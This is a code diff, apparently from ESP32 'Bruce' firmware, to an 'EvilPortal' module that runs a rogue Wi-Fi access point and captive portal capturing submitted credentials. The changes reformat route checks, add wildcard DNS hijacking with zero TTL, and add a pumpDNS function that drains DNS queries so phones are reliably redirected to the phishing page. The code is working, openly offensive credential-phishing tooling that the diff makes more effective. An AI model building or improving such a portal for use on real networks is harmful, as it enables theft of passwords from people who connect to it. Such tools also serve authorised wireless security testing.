@@ -115,14 +115,11 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
     String url = request->url();
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
-    else if (
-        url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
-        bruceConfig.evilPortalEndpoints.allowGetCreds
-    )
+    else if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
+             bruceConfig.evilPortalEndpoints.allowGetCreds)
         request->send(200, "text/html", _portal->creds_GET());
-    else if (
-        url == bruceConfig.evilPortalEndpoints.setSsidEndpoint && bruceConfig.evilPortalEndpoints.allowSetSsid
-    ) {
+    else if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
+             bruceConfig.evilPortalEndpoints.allowSetSsid) {
         if (request->hasArg("ssid")) {
             _portal->apName = request->arg("ssid").c_str();
             request->send(200, "text/html", _portal->ssid_POST());
@@ -220,7 +217,15 @@ void EvilPortal::beginAP() {
     while (millis() - tmp < 3000) yield();
 
     setupRoutes();
-    dnsServer->start(53, "*", WiFi.softAPIP());
+    // A wildcard hijack with no caching: TTL 0 keeps a client from holding on
+    // to the answer once this portal is gone, and a start failure is worth
+    // saying out loud, since without DNS the client associates and is simply
+    // never redirected.
+    dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
+    dnsServer->setTTL(0);
+    if (!dnsServer->start(53, "*", WiFi.softAPIP())) {
+        Serial.println("[PORTAL] DNS server failed to start -- no redirect will happen");
+    }
     webServer.begin();
 }
 
@@ -311,7 +316,8 @@ void EvilPortal::setupRoutes() {
     }
     if (bruceConfig.evilPortalEndpoints.allowSetSsid) {
         webServer.on(
-            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
+            bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(),
+            [this](AsyncWebServerRequest *request) {
                 if (request->hasArg("ssid")) {
                     apName = request->arg("ssid").c_str();
                     request->send(200, "text/html", ssid_POST());
@@ -357,7 +363,15 @@ void EvilPortal::restartWiFi(bool reset) {
     vTaskDelay(100 / portTICK_PERIOD_MS);
 
     setupRoutes();
-    dnsServer->start(53, "*", WiFi.softAPIP());
+    // A wildcard hijack with no caching: TTL 0 keeps a client from holding on
+    // to the answer once this portal is gone, and a start failure is worth
+    // saying out loud, since without DNS the client associates and is simply
+    // never redirected.
+    dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
+    dnsServer->setTTL(0);
+    if (!dnsServer->start(53, "*", WiFi.softAPIP())) {
+        Serial.println("[PORTAL] DNS server failed to start -- no redirect will happen");
+    }
     webServer.begin();
 
     if (reset) resetCapturedCredentials();
@@ -447,6 +461,16 @@ void EvilPortal::loop() {
             verifyPass = false;
         }
     }
+}
+
+// DNSServer::processNextRequest() answers exactly one query per call, so a
+// portal whose DNS is pumped once per heartbeat answers two lookups a second.
+// A phone checking for a captive portal fires a burst of them and gives up
+// long before that: it associates, takes its lease, and is never redirected.
+// Draining the queue is what makes the redirect happen.
+void EvilPortal::pumpDNS(uint8_t maxRequests) {
+    if (dnsServer == nullptr) return;
+    for (uint8_t i = 0; i < maxRequests; i++) dnsServer->processNextRequest();
 }
 
 void EvilPortal::processRequests() {
